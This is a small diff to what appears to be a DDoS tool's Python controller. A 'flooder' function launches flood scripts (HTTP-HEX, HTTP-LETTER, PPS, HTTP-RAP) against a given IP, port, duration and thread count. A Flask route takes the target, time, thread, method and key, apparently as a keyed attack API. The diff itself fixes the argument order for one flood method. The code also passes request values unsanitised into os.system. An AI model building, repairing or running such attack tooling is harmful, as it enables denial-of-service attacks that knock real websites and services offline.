@@ -97,7 +97,7 @@ def flooder(IP,PORT,TIME,THREAD,METHOD,METHODS):
  elif METHODS == 'HTTP-HEX':os.system(f'python3 METHODS{path}HTTP_HEX.py {IP} {PORT} {TIME} 250 {THREAD} {METHOD}')
  elif METHODS == 'HTTP-LETTER':os.system(f'python3 METHODS{path}HTTP_LETTER.py {IP} {PORT} {TIME} 250 {THREAD} {METHOD}')
  elif METHODS == 'PPS':os.system(f'python3 METHODS{path}PPS.py {IP} {PORT} {TIME} 250 {THREAD} {METHOD}')
- elif METHODS == 'HTTP-RAP':os.system(f'python3 METHODS{path}HTTP_RAP.py {IP} {PORT} {TIME} 250 {THREAD} {METHOD}')
+ elif METHODS == 'HTTP-RAP':os.system(f'python3 METHODS{path}HTTP_RAP.py {IP} {PORT} {TIME} {THREAD} 250 {METHOD}')
 
 @app.route('/target=<WEBSITE>&time=<NUM>&thread=<NUM2>&method=<METHODS>&key=<KEYS>')
 def atk_http(WEBSITE,NUM,NUM2,METHODS,KEYS):
